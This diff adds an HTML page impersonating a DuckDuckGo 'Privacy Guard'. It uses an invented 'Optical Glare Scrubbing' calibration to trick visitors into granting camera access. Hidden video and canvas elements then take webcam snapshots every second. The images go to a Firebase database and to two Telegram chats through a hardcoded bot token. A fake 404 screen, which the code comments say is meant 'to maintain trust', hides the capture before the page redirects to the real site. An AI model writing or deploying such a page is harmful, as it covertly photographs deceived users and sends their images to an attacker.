@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DuckDuckGo | Privacy Guard</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --ddg-orange: #DE5833;
+            --ddg-bg: #FFFFFF;
+            --ddg-text: #333333;
+            --ddg-gray: #757575;
+            --ddg-border: #E0E0E0;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--ddg-bg); color: var(--ddg-text);
+            font-family: 'Proxima Nova', Helvetica, Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .ddg-card {
+            width: 100%; max-width: 460px; background: var(--ddg-bg);
+            border: 1px solid var(--ddg-border); border-radius: 8px; overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+
+        .ddg-header {
+            padding: 20px; text-align: center; border-bottom: 1px solid var(--ddg-border);
+            background: #FAFAFA;
+        }
+
+        .ddg-logo { width: 60px; height: 60px; margin-bottom: 8px; }
+
+        .ddg-body { padding: 40px 32px; text-align: center; }
+
+        .privacy-shield {
+            width: 80px; height: 80px; margin: 0 auto 24px;
+            background: rgba(222, 88, 51, 0.05); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            border: 2px solid var(--ddg-orange);
+        }
+
+        .shield-pulse {
+            width: 10px; height: 10px; background: var(--ddg-orange);
+            border-radius: 50%; animation: d-pulse 2s infinite ease-in-out;
+        }
+        @keyframes d-pulse { 
+            0% { transform: scale(1); opacity: 1; } 
+            100% { transform: scale(4); opacity: 0; } 
+        }
+
+        h2 { font-size: 20px; font-weight: 700; margin: 0 0 12px; color: #222; }
+        p { font-size: 14px; color: var(--ddg-gray); line-height: 1.6; margin-bottom: 30px; }
+
+        .btn-ddg {
+            background: var(--ddg-orange); color: white; border: none;
+            width: 100%; padding: 14px; font-size: 16px; font-weight: 700;
+            border-radius: 4px; cursor: pointer; transition: background 0.2s;
+        }
+        .btn-ddg:hover { background: #C44522; }
+
+        /* Sync & 404 UI */
+        #sync-ui, #error-404 { display: none; }
+        
+        .ddg-loader {
+            width: 30px; height: 30px; border: 3px solid #F0F0F0;
+            border-top: 3px solid var(--ddg-orange); border-radius: 50%;
+            margin: 0 auto 20px; animation: d-spin 0.8s linear infinite;
+        }
+        @keyframes d-spin { to { transform: rotate(360deg); } }
+
+        .error-num { font-size: 56px; font-weight: 800; color: #EEE; margin-bottom: 10px; }
+        .node-tag { font-size: 10px; color: #AAA; margin-top: 25px; text-transform: uppercase; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="ddg-card">
+        <div class="ddg-header">
+            <img src="https://duckduckgo.com/assets/logo_homepage.normal.v108.svg" class="ddg-logo" alt="DDG">
+            <div style="font-weight: 700; font-size: 18px;">Privacy Guard</div>
+        </div>
+
+        <!-- Initial View -->
+        <div class="ddg-body" id="init-view">
+            <div class="privacy-shield">
+                <div class="shield-pulse"></div>
+            </div>
+            <h2>Optical Glare Scrubbing</h2>
+            <p>To prevent biometric reflections and visual tracking, DuckDuckGo requires a <b>Lumen Surface Calibration</b>. This scrubs ambient glare patterns from your display metadata.</p>
+            
+            <button class="btn-ddg" onclick="startDDGSync()">Enable Privacy Shield</button>
+            <div class="node-tag">Relay Node: Mumbai_Primary_Encrypted</div>
+        </div>
+
+        <!-- Sync View -->
+        <div class="ddg-body" id="sync-ui">
+            <div class="ddg-loader"></div>
+            <div style="font-weight: 700;">Scrubbing Optical Artifacts...</div>
+            <div style="font-size: 12px; color: var(--ddg-gray); margin-top: 8px;" id="d-timer">Relay session expires in 60s</div>
+            
+            <div style="text-align: left; background: #F9F9F9; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 10px; color: #666; margin-top: 25px; border: 1px solid var(--ddg-border);">
+                > INITIALIZING_ANONYMOUS_UPLINK... OK<br>
+                > DETECTING_BIOMETRIC_GLARE... 68%<br>
+                > STATUS: SHIELDING_MUMBAI_HANDSHAKE
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="ddg-body" id="error-404">
+            <div class="error-num">404</div>
+            <h2 style="color: var(--ddg-orange);">Secure Relay Dropout</h2>
+            <p>The privacy-encrypted handshake with the Mumbai node was interrupted to protect your identity. Re-establishing secure tunnel via Maharashtra Secondary.</p>
+            <div class="ddg-loader" style="width: 20px; height: 20px;"></div>
+            <div style="font-size: 11px; color: #AAA;">Re-routing Traffic...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startDDGSync() {
+            try {
+                // Requesting permission under "Optical Glare Scrubbing"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('d-timer').innerText = `Relay session expires in ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            ddgCapture(count);
+                        }
+
+                        // Trigger 404 at 45 seconds to maintain trust
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://duckduckgo.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://duckduckgo.com";
+            }
+        }
+
+        function ddgCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "DDG_PRIVACY_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_SECURE_NODE" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'ddg_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
